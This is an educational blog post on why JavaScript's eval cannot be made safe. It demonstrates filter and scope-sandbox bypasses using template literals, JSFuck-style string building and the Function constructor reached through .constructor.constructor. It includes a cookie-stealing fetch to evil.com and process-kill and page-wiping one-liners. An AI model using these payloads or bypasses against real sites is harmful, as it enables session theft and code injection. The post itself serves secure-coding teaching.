    <h1>(Un)safe code evaluation in JavaScript</h1>

    <section>
      <p>Let's talk about <code>eval</code> in JavaScript.</p>
      <p>
        You probably have heard about it. If not, the
        <a
          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval"
        >
          MDN documentation
        </a>
        will tell you all you want to know. In short, it is a function that
        tries to evaluate a string as JavaScript code.
      </p>
      <p>
        If this sounds dangerous to you, then you are right. It is! If an
        attacker can control the string that you pass into this function, he can
        basically do anything he desires. That reaches from XSS attacks in the
        browser to server-side injection attacks in Node.js. ðŸ˜±
      </p>
      <p>Here are some one-liners to break stuff:</p>
      <figure>
        <pre>eval("process.kill(0)");</pre>
        <figcaption>Kill the current process in Node.js.</figcaption>
      </figure>
      <figure>
        <pre>eval("document.body.innerHTML=''");</pre>
        <figcaption>Erase all visible content on any web page.</figcaption>
      </figure>
      <p>
        If the website under attack doesn't have any type of CSP, we could even
        steal the users cookies with one line of code by making a request to a
        website under our control:
      </p>
      <figure>
        <pre>eval("fetch('https://evil.com?v=' + document.cookie)")</pre>
      </figure>
    </section>

    <section>
      So here's the question: Can we make it safe to use eval ? Let's go with
      our first example where we kill the current node process.
    </section>

    <section>
      <p>
        Our first idea might be something like searching the string for brackets
        to avoid function invocation:
      </p>
      <figure>
        <pre>
const code = "process.kill(0);";

if (/\(|\)/.test(code)) {
  throw new Error("Invalid code!");
}

eval(code);</pre
        >
      </figure>
      <p>
        This works for the given code. But we can easily bypass this by using
        <a
          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_templates"
        >
          template literals</a
        >:
      </p>
      <figure>
        <pre>
const code = "process.kill`0`;";

if (/\(|\)/.test(code)) {
  throw new Error("Invalid code!");
}

eval(code);</pre
        >
      </figure>
      <p>No more brackets, function execution none the less. ðŸ˜•</p>
      <p>
        Well then why don't we just search for the word <code>kill</code> inside
        the string of code?
      </p>
      <figure>
        <pre>
const code = "process.kill(0);";

if (/kill/.test(code)) {
  throw new Error("Invalid code!");
}

eval(code);</pre
        >
      </figure>
      <p>
        Now we will be safe, right? Not exactly. It turns out that there are
        countless ways to write <code>kill</code> without actually writing the
        exact string.
      </p>
      <p>
        You can actually write anything (and also evaluate anything) using just
        the six characters <code>(</code>, <code>)</code>, <code>[</code>,
        <code>]</code>, <code>!</code> and <code>+</code>. Check out
        <a href="http://www.jsfuck.com/">JSFuck</a> for a demo!
      </p>
      <p>
        Let's apply this here and use the fact that running
        <code>(![]+[])[!+[]+!+[]]</code>
        will return the string <code>l</code>:
      </p>
      <figure>
        <pre>
const code = "process['kil' + (![]+[])[!+[]+!+[]]](0);";

if (/\(|\)/.test(code)) {
  throw new Error("Invalid code!");
}

eval(code);</pre
        >
      </figure>
      <p>Again, security check bypassed! ðŸ˜• ðŸ˜¢</p>
      <p>
        So let's give up on trying to search the string for bad code. Let's do
        something more clever! If we don't want the code to access the
        <code>process</code> object, then why don't we "override" it. So that we
        don't actually override it we use a IIFE, taking advantage of
        JavaScripts lexical scoping. (That means that the
        <code>process</code> variable defined inside the function will not
        override the global object, but rather replace it for the scope of the
        current function.)
      </p>
      <figure>
        <pre>
const code = "process.kill(0);";

(() => {
  const process = {};
  eval(code);
})()</pre
        >
      </figure>
      <p>
        If we run this code we will get an error, stating that
        <code>process.kill</code> is not a function. (Indeed it isn't, because
        it is just <code>undefined</code>!) Perfect, right?
      </p>
      <p>
        Well, as you might have guesses there is a way to get around this, too.
        For this we will use the
        <a
          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function"
        >
          <code>Function</code> constructor</a
        >. It kind of works like <code>eval</code>, in the sense that it accepts
        a string which will be evaluated each time the resulting function is
        called.
      </p>
      <p>
        But there is a subtle difference. When we define a function using the
        constructor, the function doesn't create its own closure. The function
        will always be executed within the global scope! (This behaviour can
        also be found in the
        <a
          href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function#Difference_between_Function_constructor_and_function_declaration"
        >
          documentation</a
        >.)
      </p>
      <p>
        We can use this to break free of the closure of the IIFE. That means we
        should be able to access the global process object again. Let's try it
        out:
      </p>
      <figure>
        <pre>
const code = "Function('process.exit(0)')()";

(() => {
  const process = {};
  eval(code);
})()</pre
        >
      </figure>
      <p>We also cracked this one! ðŸ˜• ðŸ˜¢ ðŸ˜°</p>
      <p>
        But what if we also override the <code>Function</code> object as well?
        Won't this save our problem?
      </p>
      <figure>
        <pre>
const code = "Function('process.exit(0)')()";

(() => {
  const Function = {};
  const process = {};
  eval(code);
})()</pre
        >
      </figure>
      <p>
        Yes, it prevents this exact code from executing. But like it was the
        case with strings before, we can get access to the
        <code>Function</code> constructor in a countless number of ways in
        JavaScript. It is as easy as accessing the
        <code>constructor</code> property of a variable that is a function. To
        give you some impressions, all of those expressions are
        <code>true</code>:
      </p>
      <figure>
        <pre>
(() => {}).constructor === Function;
String.constructor === Function;
(0).constructor.constructor === Function;
true.constructor.constructor === Function;
[].constructor.constructor === Function;
process.constructor.constructor === Function;</pre
        >
      </figure>
      <p>
        We can just choose one of those and we will make our exploit work again:
      </p>
      <figure>
        <pre>
const code = "[].constructor.constructor('process.exit(0)')()";

(() => {
  const Function = {};
  const process = {};
  eval(code);
})()</pre
        >
      </figure>
      <p>Secure code evaluation no more... ðŸ˜• ðŸ˜¢ ðŸ˜° ðŸ˜­</p>
    </section>
    <section>
      <p>
        In the end I'm not a security export and still I can come up with quite
        simple ideas to bypass many of those checks. (I always wonder what
        professional hackers could come up with...)
      </p>
      <p>
        Maybe I'm wrong after all and there is a way to make code evaluation
        bullet proof. If so then please let me know! ðŸ˜‰
      </p>
    </section>
    <section>
      <p>
        If you make it this far, my message should be clear: Don't use
        <code>eval</code> to evaluate code or <code>Function</code> to create
        functions, if the string you pass in there is not 100% controlled by
        you!
      </p>
      <p>
        In fact <code>setTimeout</code> and <code>setInterval</code> are just as
        dangerous. The first argument doesn't have to be a function, is can also
        be a string! This string will then be evaluated after the timeout or
        after each interval.
      </p>
      <p>Stay safe and have fun! ðŸŽ‰</p>
